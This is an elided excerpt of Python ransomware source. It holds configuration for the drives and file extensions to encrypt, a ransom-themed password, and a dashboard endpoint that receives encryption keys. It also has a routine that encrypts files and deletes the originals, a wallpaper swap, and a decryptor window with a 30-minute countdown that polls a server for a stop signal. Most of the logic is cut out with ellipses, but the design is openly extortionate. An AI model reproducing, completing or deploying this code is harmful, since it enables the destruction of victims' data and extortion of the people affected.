...
DRIVES_TO_ENCRYPT = ['E:'] #you can add as many as you want
EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
DASHBOARD_URL = 'http://localhost/dashboard/ransomdashboard/includes/api/receive_key.php'
MAX_ATTEMPTS = 100
DELAY = 5
...
class EncryptionTool:
    ...
    def encrypt_file(self, file_path):
        try:
            ...
            os.remove(file_path)#it removes the files and retains the encrypted file
...
"""
    ...
    def execute(self):
        ...
        wallpaper_path = resource_path('D:/ransomware/background.jpeg')
...
class DecryptorApp(tk.Tk):
    ...
    def check_for_remote_stop_signal(self, machine_id, check_interval=10):
        url = f"http://localhost/dashboard/ransomdashboard/includes/api/check_stop_signal.php?machine_id={machine_id}"
    ...
    def reset_timer(self):
        self.closing_time = datetime.now() + timedelta(minutes=30)
